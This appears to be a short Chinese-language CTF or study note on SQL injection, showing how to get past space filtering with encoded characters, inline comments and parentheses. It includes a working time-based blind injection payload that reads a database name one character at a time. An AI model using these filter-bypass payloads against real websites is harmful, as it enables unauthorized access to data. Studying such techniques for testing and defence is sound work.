---
icon: pen-to-square
date: 2025-04-30
tags: 
title: web6--sql注入
category:
  - 项目
---
## 1.绕过空格`（注释符/* */，%a0）`：

　　两个空格代替一个空格，用Tab代替空格，%a0=空格：`

```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
```

最基本的绕过方法，用注释替换空格

#### 2.括号绕过空格：

　　如果空格被过滤，括号没有被过滤，可以用括号绕过。

　　在MySQL中，括号是用来包围[子查询](https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020)的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

```
select(user())from dual where(1=1)and(2=2)
```
这种过滤方法常常用于[time](https://so.csdn.net/so/search?q=time&spm=1001.2101.3001.7020) based盲注,例如：
```
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
```
